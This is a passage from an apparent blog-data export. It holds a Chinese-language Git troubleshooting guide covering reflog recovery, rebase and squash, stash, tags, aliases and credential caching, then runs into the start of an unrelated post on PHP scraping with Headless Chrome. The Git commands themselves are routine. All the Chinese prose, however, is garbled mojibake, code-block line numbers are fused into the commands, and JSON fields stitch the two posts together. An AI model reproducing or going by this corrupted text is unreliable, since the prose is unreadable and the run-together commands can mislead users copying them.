(my-branch)$ ls README.md foo.txt æ·»åŠ æ–‡ä»¶å¹¶åšä¸€æ¬¡æäº¤ 123456789101112131415161718(my-branch)$ git add . (my-branch)$ git commit -m 'foo.txt added' (my-branch)$ foo.txt added 1 files changed, 1 insertions(+) create mode 100644 foo.txt (my-branch)$ git log commit 4e3cd85a670ced7cc17a2b5d8d3d809ac88d5012 Author: siemiatj &lt;siemiatj@example.com&gt; Date: Wed Jul 30 00:34:10 2014 +0200 foo.txt added commit 69204cdf0acbab201619d95ad8295928e7f411d5 Author: Kate Hudson &lt;katehudson@example.com&gt; Date: Tue Jul 29 13:14:46 2014 -0400 Fixes #6: Force pushing after amending commits ç°åœ¨æˆ‘ä»¬åˆ‡å›åˆ°ä¸»(main)åˆ†æ”¯ï¼Œâ€˜ä¸å°å¿ƒçš„â€™åˆ é™¤my-branchåˆ†æ”¯ 1234567(my-branch)$ git checkout main Switched to branch 'main' Your branch is up-to-date with 'origin/main'. (main)$ git branch -D my-branch Deleted branch my-branch (was 4e3cd85). (main)$ echo oh noes, deleted my branch! oh noes, deleted my branch! åœ¨è¿™æ—¶å€™ä½ åº”è¯¥æƒ³èµ·äº†reflog, ä¸€ä¸ªå‡çº§ç‰ˆçš„æ—¥å¿—ï¼Œå®ƒå­˜å‚¨äº†ä»“åº“(repo)é‡Œé¢æ‰€æœ‰åŠ¨ä½œçš„å†å²ã€‚ 1234(main)$ git reflog 69204cd HEAD@&#123;0&#125;: checkout: moving from my-branch to main 4e3cd85 HEAD@&#123;1&#125;: commit: foo.txt added 69204cd HEAD@&#123;2&#125;: checkout: moving from main to my-branch æ­£å¦‚ä½ æ‰€è§ï¼Œæˆ‘ä»¬æœ‰ä¸€ä¸ªæ¥è‡ªåˆ é™¤åˆ†æ”¯çš„æäº¤hash(commit hash)ï¼Œæ¥ä¸‹æ¥çœ‹çœ‹æ˜¯å¦èƒ½æ¢å¤åˆ é™¤äº†çš„åˆ†æ”¯ã€‚ 123456(main)$ git checkout -b my-branch-help Switched to a new branch 'my-branch-help' (my-branch-help)$ git reset --hard 4e3cd85 HEAD is now at 4e3cd85 foo.txt added (my-branch-help)$ ls README.md foo.txt çœ‹! æˆ‘ä»¬æŠŠåˆ é™¤çš„æ–‡ä»¶æ‰¾å›æ¥äº†ã€‚Gitçš„ reflog åœ¨rebasingå‡ºé”™çš„æ—¶å€™ä¹Ÿæ˜¯åŒæ ·æœ‰ç”¨çš„ã€‚ æˆ‘æƒ³åˆ é™¤ä¸€ä¸ªåˆ†æ”¯åˆ é™¤ä¸€ä¸ªè¿œç¨‹åˆ†æ”¯: 1(main)$ git push origin --delete my-branch ä½ ä¹Ÿå¯ä»¥: 1(main)$ git push origin :my-branch åˆ é™¤ä¸€ä¸ªæœ¬åœ°åˆ†æ”¯: 1(main)$ git branch -D my-branch æˆ‘æƒ³ä»åˆ«äººæ­£åœ¨å·¥ä½œçš„è¿œç¨‹åˆ†æ”¯ç­¾å‡º(checkout)ä¸€ä¸ªåˆ†æ”¯é¦–å…ˆ, ä»è¿œç¨‹æ‹‰å–(fetch) æ‰€æœ‰åˆ†æ”¯: 1(main)$ git fetch --all å‡è®¾ä½ æƒ³è¦ä»è¿œç¨‹çš„davesåˆ†æ”¯ç­¾å‡ºåˆ°æœ¬åœ°çš„daves 123(main)$ git checkout --track origin/daves Branch daves set up to track remote branch daves from origin. Switched to a new branch 'daves' (--track æ˜¯ git checkout -b [branch] [remotename]/[branch] çš„ç®€å†™) è¿™æ ·å°±å¾—åˆ°äº†ä¸€ä¸ªdavesåˆ†æ”¯çš„æœ¬åœ°æ‹·è´, ä»»ä½•æ¨è¿‡(pushed)çš„æ›´æ–°ï¼Œè¿œç¨‹éƒ½èƒ½çœ‹åˆ°. å°†è¿œç¨‹åˆ†æ”¯è®¾ç½®ä¸ºè·Ÿè¸ªåˆ†æ”¯é¦–å…ˆ, ä»è¿œç¨‹æ‹‰å–(fetch) æ‰€æœ‰åˆ†æ”¯ï¼š 1$ git fetch --all å¦‚æœæœ¬åœ°åˆ†æ”¯ä¸å­˜åœ¨å°†è¿œç¨‹åˆ†æ”¯ release ä¸æœ¬åœ°ä¸å­˜åœ¨çš„åˆ†æ”¯è®¾ç½®è·Ÿè¸ªï¼š 1$ git branch --track release remotes/origin/release å¦‚æœåˆ†æ”¯å·²ç»å­˜åœ¨äº†ï¼Œåˆ™ä¼šè®¾ç½®å¤±è´¥ã€‚ å¦‚æœæœ¬åœ°åˆ†æ”¯å·²ç»å­˜åœ¨å°†è¿œç¨‹åˆ†æ”¯ release ä¸æœ¬åœ°åˆ†æ”¯ releaseè®¾ç½®è·Ÿè¸ªï¼š 1$ git branch --set-upstream-to=origin/release release æ ‡ç­¾(Tag)ä»æŸä¸ªæ ‡ç­¾(tagï¼‰æ£€å‡ºä¸€ä¸ªæ–°çš„åˆ†æ”¯ï¼š 1$ git checkout -b [branch] [tag] Rebasing å’Œåˆå¹¶(Merging)æˆ‘æƒ³æ’¤é”€rebase/mergeä½ å¯ä»¥åˆå¹¶(merge)æˆ–rebaseäº†ä¸€ä¸ªé”™è¯¯çš„åˆ†æ”¯, æˆ–è€…å®Œæˆä¸äº†ä¸€ä¸ªè¿›è¡Œä¸­çš„rebase/mergeã€‚Git åœ¨è¿›è¡Œå±é™©æ“ä½œçš„æ—¶å€™ä¼šæŠŠåŸå§‹çš„HEADä¿å­˜åœ¨ä¸€ä¸ªå«ORIG_HEADçš„å˜é‡é‡Œ, æ‰€ä»¥è¦æŠŠåˆ†æ”¯æ¢å¤åˆ°rebase/mergeå‰çš„çŠ¶æ€æ˜¯å¾ˆå®¹æ˜“çš„ã€‚ 1(my-branch)$ git reset --hard ORIG_HEAD æˆ‘å·²ç»rebaseè¿‡, ä½†æ˜¯æˆ‘ä¸æƒ³å¼ºæ¨(force push)ä¸å¹¸çš„æ˜¯ï¼Œå¦‚æœä½ æƒ³æŠŠè¿™äº›å˜åŒ–(changes)ååº”åˆ°è¿œç¨‹åˆ†æ”¯ä¸Šï¼Œä½ å°±å¿…é¡»å¾—å¼ºæ¨(force push)ã€‚æ˜¯å› ä½ å¿«è¿›(Fast forward)äº†æäº¤ï¼Œæ”¹å˜äº†Gitå†å², è¿œç¨‹åˆ†æ”¯ä¸ä¼šæ¥å—å˜åŒ–(changes)ï¼Œé™¤éå¼ºæ¨(force push)ã€‚ è¿™å°±æ˜¯è®¸å¤šäººä½¿ç”¨ merge å·¥ä½œæµ, è€Œä¸æ˜¯ rebasing å·¥ä½œæµçš„ä¸»è¦åŸå› ä¹‹ä¸€ï¼Œ å¼€å‘è€…çš„å¼ºæ¨(force push)ä¼šä½¿å¤§çš„å›¢é˜Ÿé™·å…¥éº»çƒ¦ã€‚ä½¿ç”¨æ—¶éœ€è¦æ³¨æ„ï¼Œä¸€ç§å®‰å…¨ä½¿ç”¨ rebase çš„æ–¹æ³•æ˜¯ï¼Œä¸è¦æŠŠä½ çš„å˜åŒ–(changes)åæ˜ åˆ°è¿œç¨‹åˆ†æ”¯ä¸Š, è€Œæ˜¯æŒ‰ä¸‹é¢çš„åš: 1234(main)$ git checkout my-branch (my-branch)$ git rebase -i main (my-branch)$ git checkout main (main)$ git merge --ff-only my-branch æˆ‘éœ€è¦ç»„åˆ(combine)å‡ ä¸ªæäº¤(commit)å‡è®¾ä½ çš„å·¥ä½œåˆ†æ”¯å°†ä¼šåšå¯¹äº main çš„pull-requestã€‚ä¸€èˆ¬æƒ…å†µä¸‹ä½ ä¸å…³å¿ƒæäº¤(commit)çš„æ—¶é—´æˆ³ï¼Œåªæƒ³ç»„åˆ æ‰€æœ‰ æäº¤(commit) åˆ°ä¸€ä¸ªå•ç‹¬çš„é‡Œé¢, ç„¶åé‡ç½®(reset)é‡æäº¤(recommit)ã€‚ç¡®ä¿ä¸»(main)åˆ†æ”¯æ˜¯æœ€æ–°çš„å’Œä½ çš„å˜åŒ–éƒ½å·²ç»æäº¤äº†, ç„¶å: 12(my-branch)$ git reset --soft main (my-branch)$ git commit -am \"New awesome feature\" å¦‚æœä½ æƒ³è¦æ›´å¤šçš„æ§åˆ¶, æƒ³è¦ä¿ç•™æ—¶é—´æˆ³, ä½ éœ€è¦åšäº¤äº’å¼rebase (interactive rebase): 1(my-branch)$ git rebase -i main å¦‚æœæ²¡æœ‰ç›¸å¯¹çš„å…¶å®ƒåˆ†æ”¯ï¼Œ ä½ å°†ä¸å¾—ä¸ç›¸å¯¹è‡ªå·±çš„HEAD è¿›è¡Œ rebaseã€‚ä¾‹å¦‚ï¼šä½ æƒ³ç»„åˆæœ€è¿‘çš„ä¸¤æ¬¡æäº¤(commit), ä½ å°†ç›¸å¯¹äºHEAD~2 è¿›è¡Œrebaseï¼Œ ç»„åˆæœ€è¿‘3æ¬¡æäº¤(commit), ç›¸å¯¹äºHEAD~3, ç­‰ç­‰ã€‚ 1(main)$ git rebase -i HEAD~2 åœ¨ä½ æ‰§è¡Œäº†äº¤äº’å¼ rebaseçš„å‘½ä»¤(interactive rebase command)å, ä½ å°†åœ¨ä½ çš„ç¼–è¾‘å™¨é‡Œçœ‹åˆ°ç±»ä¼¼ä¸‹é¢çš„å†…å®¹: 12345678910111213141516171819202122pick a9c8a1d Some refactoring pick 01b2fd8 New awesome feature pick b729ad5 fixup pick e3851e8 another fix # Rebase 8074d12..b729ad5 onto 8074d12 # # Commands: # p, pick = use commit # r, reword = use commit, but edit the commit message # e, edit = use commit, but stop for amending # s, squash = use commit, but meld into previous commit # f, fixup = like \"squash\", but discard this commit's log message # x, exec = run command (the rest of the line) using shell # # These lines can be re-ordered; they are executed from top to bottom. # # If you remove a line here THAT COMMIT WILL BE LOST. # # However, if you remove everything, the rebase will be aborted. # # Note that empty commits are commented out æ‰€æœ‰ä»¥ # å¼€å¤´çš„è¡Œéƒ½æ˜¯æ³¨é‡Š, ä¸ä¼šå½±å“ rebase. ç„¶åï¼Œä½ å¯ä»¥ç”¨ä»»ä½•ä¸Šé¢å‘½ä»¤åˆ—è¡¨çš„å‘½ä»¤æ›¿æ¢ pick, ä½ ä¹Ÿå¯ä»¥é€šè¿‡åˆ é™¤å¯¹åº”çš„è¡Œæ¥åˆ é™¤ä¸€ä¸ªæäº¤(commit)ã€‚ ä¾‹å¦‚, å¦‚æœä½ æƒ³ å•ç‹¬ä¿ç•™æœ€æ—§(first)çš„æäº¤(commit),ç»„åˆæ‰€æœ‰å‰©ä¸‹çš„åˆ°ç¬¬äºŒä¸ªé‡Œé¢, ä½ å°±åº”è¯¥ç¼–è¾‘ç¬¬äºŒä¸ªæäº¤(commit)åé¢çš„æ¯ä¸ªæäº¤(commit) å‰çš„å•è¯ä¸º f: 1234pick a9c8a1d Some refactoring pick 01b2fd8 New awesome feature f b729ad5 fixup f e3851e8 another fix å¦‚æœä½ æƒ³ç»„åˆè¿™äº›æäº¤(commit) å¹¶é‡å‘½åè¿™ä¸ªæäº¤(commit), ä½ åº”è¯¥åœ¨ç¬¬äºŒä¸ªæäº¤(commit)æ—è¾¹æ·»åŠ ä¸€ä¸ªrï¼Œæˆ–è€…æ›´ç®€å•çš„ç”¨s æ›¿ä»£ f: 1234pick a9c8a1d Some refactoring pick 01b2fd8 New awesome feature s b729ad5 fixup s e3851e8 another fix ä½ å¯ä»¥åœ¨æ¥ä¸‹æ¥å¼¹å‡ºçš„æ–‡æœ¬æç¤ºæ¡†é‡Œé‡å‘½åæäº¤(commit)ã€‚ 12345678910Newer, awesomer features # Please enter the commit message for your changes. Lines starting # with '#' will be ignored, and an empty message aborts the commit. # rebase in progress; onto 8074d12 # You are currently editing a commit while rebasing branch 'main' on '8074d12'. # # Changes to be committed: # modified: README.md # å¦‚æœæˆåŠŸäº†, ä½ åº”è¯¥çœ‹åˆ°ç±»ä¼¼ä¸‹é¢çš„å†…å®¹: 1(main)$ Successfully rebased and updated refs/heads/main. å®‰å…¨åˆå¹¶(merging)ç­–ç•¥--no-commit æ‰§è¡Œåˆå¹¶(merge)ä½†ä¸è‡ªåŠ¨æäº¤, ç»™ç”¨æˆ·åœ¨åšæäº¤å‰æ£€æŸ¥å’Œä¿®æ”¹çš„æœºä¼šã€‚no-ff ä¼šä¸ºç‰¹æ€§åˆ†æ”¯(feature branch)çš„å­˜åœ¨è¿‡ç•™ä¸‹è¯æ®, ä¿æŒé¡¹ç›®å†å²ä¸€è‡´ã€‚ 1(main)$ git merge --no-ff --no-commit my-branch æˆ‘éœ€è¦å°†ä¸€ä¸ªåˆ†æ”¯åˆå¹¶æˆä¸€ä¸ªæäº¤(commit)1(main)$ git merge --squash my-branch æˆ‘åªæƒ³ç»„åˆ(combine)æœªæ¨çš„æäº¤(unpushed commit)æœ‰æ—¶å€™ï¼Œåœ¨å°†æ•°æ®æ¨å‘ä¸Šæ¸¸ä¹‹å‰ï¼Œä½ æœ‰å‡ ä¸ªæ­£åœ¨è¿›è¡Œçš„å·¥ä½œæäº¤(commit)ã€‚è¿™æ—¶å€™ä¸å¸Œæœ›æŠŠå·²ç»æ¨(push)è¿‡çš„ç»„åˆè¿›æ¥ï¼Œå› ä¸ºå…¶ä»–äººå¯èƒ½å·²ç»æœ‰æäº¤(commit)å¼•ç”¨å®ƒä»¬äº†ã€‚ 1(main)$ git rebase -i @&#123;u&#125; è¿™ä¼šäº§ç”Ÿä¸€æ¬¡äº¤äº’å¼çš„rebase(interactive rebase), åªä¼šåˆ—å‡ºæ²¡æœ‰æ¨(push)çš„æäº¤(commit)ï¼Œ åœ¨è¿™ä¸ªåˆ—è¡¨æ—¶è¿›è¡Œreorder/fix/squash éƒ½æ˜¯å®‰å…¨çš„ã€‚ æ£€æŸ¥æ˜¯å¦åˆ†æ”¯ä¸Šçš„æ‰€æœ‰æäº¤(commit)éƒ½åˆå¹¶(merge)è¿‡äº†æ£€æŸ¥ä¸€ä¸ªåˆ†æ”¯ä¸Šçš„æ‰€æœ‰æäº¤(commit)æ˜¯å¦éƒ½å·²ç»åˆå¹¶(merge)åˆ°äº†å…¶å®ƒåˆ†æ”¯, ä½ åº”è¯¥åœ¨è¿™äº›åˆ†æ”¯çš„head(æˆ–ä»»ä½• commits)ä¹‹é—´åšä¸€æ¬¡diff: 1(main)$ git log --graph --left-right --cherry-pick --oneline HEAD...feature/120-on-scroll è¿™ä¼šå‘Šè¯‰ä½ åœ¨ä¸€ä¸ªåˆ†æ”¯é‡Œæœ‰è€Œå¦ä¸€ä¸ªåˆ†æ”¯æ²¡æœ‰çš„æ‰€æœ‰æäº¤(commit), å’Œåˆ†æ”¯ä¹‹é—´ä¸å…±äº«çš„æäº¤(commit)çš„åˆ—è¡¨ã€‚å¦ä¸€ä¸ªåšæ³•å¯ä»¥æ˜¯: 1(main)$ git log main ^feature/120-on-scroll --no-merges äº¤äº’å¼rebase(interactive rebase)å¯èƒ½å‡ºç°çš„é—®é¢˜è¿™ä¸ªrebase ç¼–è¾‘å±å¹•å‡ºç°â€™noopâ€™å¦‚æœä½ çœ‹åˆ°çš„æ˜¯è¿™æ ·: 1noop è¿™æ„å‘³ç€ä½ rebaseçš„åˆ†æ”¯å’Œå½“å‰åˆ†æ”¯åœ¨åŒä¸€ä¸ªæäº¤(commit)ä¸Š, æˆ–è€… é¢†å…ˆ(ahead) å½“å‰åˆ†æ”¯ã€‚ä½ å¯ä»¥å°è¯•: æ£€æŸ¥ç¡®ä¿ä¸»(main)åˆ†æ”¯æ²¡æœ‰é—®é¢˜ rebase HEAD~2 æˆ–è€…æ›´æ—© æœ‰å†²çªçš„æƒ…å†µå¦‚æœä½ ä¸èƒ½æˆåŠŸçš„å®Œæˆrebase, ä½ å¯èƒ½å¿…é¡»è¦è§£å†³å†²çªã€‚ é¦–å…ˆæ‰§è¡Œ git status æ‰¾å‡ºå“ªäº›æ–‡ä»¶æœ‰å†²çª: 1234567(my-branch)$ git status On branch my-branch Changes not staged for commit: (use \"git add &lt;file&gt;...\" to update what will be committed) (use \"git checkout -- &lt;file&gt;...\" to discard changes in working directory) modified: README.md åœ¨è¿™ä¸ªä¾‹å­é‡Œé¢, README.md æœ‰å†²çªã€‚æ‰“å¼€è¿™ä¸ªæ–‡ä»¶æ‰¾åˆ°ç±»ä¼¼ä¸‹é¢çš„å†…å®¹: 12345&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD some code ========= some code &gt;&gt;&gt;&gt;&gt;&gt;&gt; new-commit ä½ éœ€è¦è§£å†³æ–°æäº¤çš„ä»£ç (ç¤ºä¾‹é‡Œ, ä»ä¸­é—´==çº¿åˆ°new-commitçš„åœ°æ–¹)ä¸HEAD ä¹‹é—´ä¸ä¸€æ ·çš„åœ°æ–¹. æœ‰æ—¶å€™è¿™äº›åˆå¹¶éå¸¸å¤æ‚ï¼Œä½ åº”è¯¥ä½¿ç”¨å¯è§†åŒ–çš„å·®å¼‚ç¼–è¾‘å™¨(visual diff editor): 1(main*)$ git mergetool -t opendiff åœ¨ä½ è§£å†³å®Œæ‰€æœ‰å†²çªå’Œæµ‹è¯•è¿‡å, git add å˜åŒ–äº†çš„(changed)æ–‡ä»¶, ç„¶åç”¨git rebase --continue ç»§ç»­rebaseã€‚ 12(my-branch)$ git add README.md (my-branch)$ git rebase --continue å¦‚æœåœ¨è§£å†³å®Œæ‰€æœ‰çš„å†²çªè¿‡åï¼Œå¾—åˆ°äº†ä¸æäº¤å‰ä¸€æ ·çš„ç»“æœ, å¯ä»¥æ‰§è¡Œgit rebase --skipã€‚ ä»»ä½•æ—¶å€™ä½ æƒ³ç»“æŸæ•´ä¸ªrebase è¿‡ç¨‹ï¼Œå›æ¥rebaseå‰çš„åˆ†æ”¯çŠ¶æ€, ä½ å¯ä»¥åš: 1(my-branch)$ git rebase --abort Stashæš‚å­˜æ‰€æœ‰æ”¹åŠ¨æš‚å­˜ä½ å·¥ä½œç›®å½•ä¸‹çš„æ‰€æœ‰æ”¹åŠ¨ 1$ git stash ä½ å¯ä»¥ä½¿ç”¨-uæ¥æ’é™¤ä¸€äº›æ–‡ä»¶ 1$ git stash -u æš‚å­˜æŒ‡å®šæ–‡ä»¶å‡è®¾ä½ åªæƒ³æš‚å­˜æŸä¸€ä¸ªæ–‡ä»¶ 1$ git stash push working-directory-path/filename.ext å‡è®¾ä½ æƒ³æš‚å­˜å¤šä¸ªæ–‡ä»¶ 1$ git stash push working-directory-path/filename1.ext working-directory-path/filename2.ext æš‚å­˜æ—¶è®°å½•æ¶ˆæ¯è¿™æ ·ä½ å¯ä»¥åœ¨listæ—¶çœ‹åˆ°å®ƒ 1$ git stash save &lt;message&gt; æˆ– 1$ git stash push -m &lt;message&gt; ä½¿ç”¨æŸä¸ªæŒ‡å®šæš‚å­˜é¦–å…ˆä½ å¯ä»¥æŸ¥çœ‹ä½ çš„stashè®°å½• 1$ git stash list ç„¶åä½ å¯ä»¥applyæŸä¸ªstash 1$ git stash apply \"stash@&#123;n&#125;\" æ­¤å¤„ï¼Œ â€˜nâ€™æ˜¯stashåœ¨æ ˆä¸­çš„ä½ç½®ï¼Œæœ€ä¸Šå±‚çš„stashä¼šæ˜¯0 é™¤æ­¤ä¹‹å¤–ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨æ—¶é—´æ ‡è®°(å‡å¦‚ä½ èƒ½è®°å¾—çš„è¯)ã€‚ 1$ git stash apply \"stash@&#123;2.hours.ago&#125;\" æš‚å­˜æ—¶ä¿ç•™æœªæš‚å­˜çš„å†…å®¹ä½ éœ€è¦æ‰‹åŠ¨createä¸€ä¸ªstash commitï¼Œ ç„¶åä½¿ç”¨git stash storeã€‚ 12$ git stash create $ git stash store -m \"commit-message\" CREATED_SHA1 æ‚é¡¹(Miscellaneous Objects)å…‹éš†æ‰€æœ‰å­æ¨¡å—1$ git clone --recursive git://github.com/foo/bar.git å¦‚æœå·²ç»å…‹éš†äº†: 1$ git submodule update --init --recursive åˆ é™¤æ ‡ç­¾(tag)12$ git tag -d &lt;tag_name&gt; $ git push &lt;remote&gt; :refs/tags/&lt;tag_name&gt; æ¢å¤å·²åˆ é™¤æ ‡ç­¾(tag)å¦‚æœä½ æƒ³æ¢å¤ä¸€ä¸ªå·²åˆ é™¤æ ‡ç­¾(tag), å¯ä»¥æŒ‰ç…§ä¸‹é¢çš„æ­¥éª¤: é¦–å…ˆ, éœ€è¦æ‰¾åˆ°æ— æ³•è®¿é—®çš„æ ‡ç­¾(unreachable tag): 1$ git fsck --unreachable | grep tag è®°ä¸‹è¿™ä¸ªæ ‡ç­¾(tag)çš„hashï¼Œç„¶åç”¨Gitçš„ update-ref 1$ git update-ref refs/tags/&lt;tag_name&gt; &lt;hash&gt; è¿™æ—¶ä½ çš„æ ‡ç­¾(tag)åº”è¯¥å·²ç»æ¢å¤äº†ã€‚ å·²åˆ é™¤è¡¥ä¸(patch)å¦‚æœæŸäººåœ¨ GitHub ä¸Šç»™ä½ å‘äº†ä¸€ä¸ªpull request, ä½†æ˜¯ç„¶åä»–åˆ é™¤äº†ä»–è‡ªå·±çš„åŸå§‹ fork, ä½ å°†æ²¡æ³•å…‹éš†ä»–ä»¬çš„æäº¤(commit)æˆ–ä½¿ç”¨ git amã€‚åœ¨è¿™ç§æƒ…å†µä¸‹, æœ€å¥½æ‰‹åŠ¨çš„æŸ¥çœ‹ä»–ä»¬çš„æäº¤(commit)ï¼Œå¹¶æŠŠå®ƒä»¬æ‹·è´åˆ°ä¸€ä¸ªæœ¬åœ°æ–°åˆ†æ”¯ï¼Œç„¶ååšæäº¤ã€‚ åšå®Œæäº¤å, å†ä¿®æ”¹ä½œè€…ï¼Œå‚è§å˜æ›´ä½œè€…ã€‚ç„¶å, åº”ç”¨å˜åŒ–, å†å‘èµ·ä¸€ä¸ªæ–°çš„pull requestã€‚ è·Ÿè¸ªæ–‡ä»¶(Tracking Files)æˆ‘åªæƒ³æ”¹å˜ä¸€ä¸ªæ–‡ä»¶åå­—çš„å¤§å°å†™ï¼Œè€Œä¸ä¿®æ”¹å†…å®¹1(main)$ git mv --force myfile MyFile æˆ‘æƒ³ä»Gitåˆ é™¤ä¸€ä¸ªæ–‡ä»¶ï¼Œä½†ä¿ç•™è¯¥æ–‡ä»¶1(main)$ git rm --cached log.txt é…ç½®(Configuration)æˆ‘æƒ³ç»™ä¸€äº›Gitå‘½ä»¤æ·»åŠ åˆ«å(alias)åœ¨ OS X å’Œ Linux ä¸‹, ä½ çš„ Gitçš„é…ç½®æ–‡ä»¶å‚¨å­˜åœ¨ ~/.gitconfigã€‚æˆ‘åœ¨[alias] éƒ¨åˆ†æ·»åŠ äº†ä¸€äº›å¿«æ·åˆ«å(å’Œä¸€äº›æˆ‘å®¹æ˜“æ‹¼å†™é”™è¯¯çš„)ï¼Œå¦‚ä¸‹: 123456789101112131415161718192021[alias] a = add amend = commit --amend c = commit ca = commit --amend ci = commit -a co = checkout d = diff dc = diff --changed ds = diff --staged f = fetch loll = log --graph --decorate --pretty=oneline --abbrev-commit logs = log --color --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset' --abbrev-commit m = merge one = log --pretty=oneline outstanding = rebase -i @&#123;u&#125; s = status unpushed = log @&#123;u&#125; wc = whatchanged wip = rebase -i @&#123;u&#125; zap = fetch -p æˆ‘æƒ³ç¼“å­˜ä¸€ä¸ªä»“åº“(repository)çš„ç”¨æˆ·åå’Œå¯†ç ä½ å¯èƒ½æœ‰ä¸€ä¸ªä»“åº“éœ€è¦æˆæƒï¼Œè¿™æ—¶ä½ å¯ä»¥ç¼“å­˜ç”¨æˆ·åå’Œå¯†ç ï¼Œè€Œä¸ç”¨æ¯æ¬¡æ¨/æ‹‰(push/pull)çš„æ—¶å€™éƒ½è¾“å…¥ï¼ŒCredential helperèƒ½å¸®ä½ ã€‚ 1234$ git config --global credential.helper cache # Set git to use the credential memory cache $ git config --global credential.helper 'cache --timeout=3600' # Set the cache to timeout after 1 hour (setting is in seconds) æˆ‘ä¸çŸ¥é“æˆ‘åšé”™äº†äº›ä»€ä¹ˆä½ æŠŠäº‹æƒ…æç ¸äº†ï¼šä½  é‡ç½®(reset) äº†ä¸€äº›ä¸œè¥¿, æˆ–è€…ä½ åˆå¹¶äº†é”™è¯¯çš„åˆ†æ”¯, äº¦æˆ–ä½ å¼ºæ¨äº†åæ‰¾ä¸åˆ°ä½ è‡ªå·±çš„æäº¤(commit)äº†ã€‚æœ‰äº›æ—¶å€™, ä½ ä¸€ç›´éƒ½åšå¾—å¾ˆå¥½, ä½†ä½ æƒ³å›åˆ°ä»¥å‰çš„æŸä¸ªçŠ¶æ€ã€‚ è¿™å°±æ˜¯ git reflog çš„ç›®çš„ï¼Œ reflog è®°å½•å¯¹åˆ†æ”¯é¡¶ç«¯(the tip of a branch)çš„ä»»ä½•æ”¹å˜, å³ä½¿é‚£ä¸ªé¡¶ç«¯æ²¡æœ‰è¢«ä»»ä½•åˆ†æ”¯æˆ–æ ‡ç­¾å¼•ç”¨ã€‚åŸºæœ¬ä¸Š, æ¯æ¬¡HEADçš„æ”¹å˜, ä¸€æ¡æ–°çš„è®°å½•å°±ä¼šå¢åŠ åˆ°reflogã€‚é—æ†¾çš„æ˜¯ï¼Œè¿™åªå¯¹æœ¬åœ°åˆ†æ”¯èµ·ä½œç”¨ï¼Œä¸”å®ƒåªè·Ÿè¸ªåŠ¨ä½œ (ä¾‹å¦‚ï¼Œä¸ä¼šè·Ÿè¸ªä¸€ä¸ªæ²¡æœ‰è¢«è®°å½•çš„æ–‡ä»¶çš„ä»»ä½•æ”¹å˜)ã€‚ 1234(main)$ git reflog 0a2e358 HEAD@&#123;0&#125;: reset: moving to HEAD~2 0254ea7 HEAD@&#123;1&#125;: checkout: moving from 2.2 to main c10f740 HEAD@&#123;2&#125;: checkout: moving from main to 2.2 ä¸Šé¢çš„reflogå±•ç¤ºäº†ä»mainåˆ†æ”¯ç­¾å‡º(checkout)åˆ°2.2 åˆ†æ”¯ï¼Œç„¶åå†ç­¾å›ã€‚é‚£é‡Œï¼Œè¿˜æœ‰ä¸€ä¸ªç¡¬é‡ç½®(hard reset)åˆ°ä¸€ä¸ªè¾ƒæ—§çš„æäº¤ã€‚æœ€æ–°çš„åŠ¨ä½œå‡ºç°åœ¨æœ€ä¸Šé¢ä»¥ HEAD@{0}æ ‡è¯†. å¦‚æœäº‹å®è¯æ˜ä½ ä¸å°å¿ƒå›ç§»(move back)äº†æäº¤(commit), reflog ä¼šåŒ…å«ä½ ä¸å°å¿ƒå›ç§»å‰mainä¸ŠæŒ‡å‘çš„æäº¤(0254ea7)ã€‚ 1$ git reset --hard 0254ea7 ç„¶åä½¿ç”¨git resetå°±å¯ä»¥æŠŠmainæ”¹å›åˆ°ä¹‹å‰çš„commitï¼Œè¿™æä¾›äº†ä¸€ä¸ªåœ¨å†å²è¢«æ„å¤–æ›´æ”¹æƒ…å†µä¸‹çš„å®‰å…¨ç½‘ã€‚","categories":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/categories/Git/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://www.0x2beace.com/tags/Git/"}]},{"title":"PHP ä½¿ç”¨Headless Chrome æŠ“å–ç½‘é¡µ","slug":"php-uses-headless-chrome-to-scrape-web-pages","date":"2022-03-10T09:42:57.000Z","updated":"2022-03-11T01:20:06.988Z","comments":true,"path":"php-uses-headless-chrome-to-scrape-web-pages/","link":"","permalink":"https://www.0x2beace.com/php-uses-headless-chrome-to-scrape-web-pages/","excerpt":"PHP ä½¿ç”¨ Headless Chrome æŠ“å–ç½‘é¡µé€šå¸¸ä½¿ç”¨ PHP æŠ“å–ç½‘é¡µæ•°æ®æ—¶ï¼Œæœ€å¸¸è§çš„ä¸¤ç§æ–¹å¼å°±æ˜¯ CURL å’Œ file_get_contentsã€‚è¿™æ ·ç¡®å®å¯ä»¥æŠ“å–åˆ°æ•°æ®ï¼Œä½†æ˜¯æ— æ³•ç­‰å¾…ç­‰å¾…é¡µé¢ä¸Šçš„ JS åŠ è½½å®Œæˆä¹‹åæ‰è¿›è¡Œæ•°æ®æŠ“å–ã€‚ äºæ˜¯ä¾¿æœ‰äº†ä½¿ç”¨ PhantomJSï¼ŒSlimerJS è¿™ç±»è§£å†³æ–¹æ¡ˆã€‚ ä»Šå¤©è¦ä»‹ç»çš„å¹¶ä¸æ˜¯ä¸Šé¢ä¸¤ä½ï¼Œè€Œæ˜¯ Headless Chromeã€‚","text":"PHP ä½¿ç”¨ Headless Chrome æŠ“å–ç½‘é¡µé€šå¸¸ä½¿ç”¨ PHP æŠ“å–ç½‘é¡µæ•°æ®æ—¶ï¼Œæœ€å¸¸è§çš„ä¸¤ç§æ–¹å¼å°±æ˜¯ CURL å’Œ file_get_contentsã€‚è¿™æ ·ç¡®å®å¯ä»¥æŠ“å–åˆ°æ•°æ®ï¼Œä½†æ˜¯æ— æ³•ç­‰å¾…ç­‰å¾…é¡µé¢ä¸Šçš„ JS åŠ è½½å®Œæˆä¹‹åæ‰è¿›è¡Œæ•°æ®æŠ“å–ã€‚ äºæ˜¯ä¾¿æœ‰äº†ä½¿ç”¨ PhantomJSï¼ŒSlimerJS è¿™ç±»è§£å†³æ–¹æ¡ˆã€‚ ä»Šå¤©è¦ä»‹ç»çš„å¹¶ä¸æ˜¯ä¸Šé¢ä¸¤ä½ï¼Œè€Œæ˜¯ Headless Chromeã€‚ ä»€ä¹ˆæ˜¯ Headless ChromeHeadless Chrome æ˜¯ Chrome æµè§ˆå™¨çš„æ— ç•Œé¢å½¢æ€ï¼Œå¯ä»¥åœ¨ä¸æ‰“å¼€æµè§ˆå™¨çš„å‰æä¸‹ï¼Œä½¿ç”¨æ‰€æœ‰ Chrome 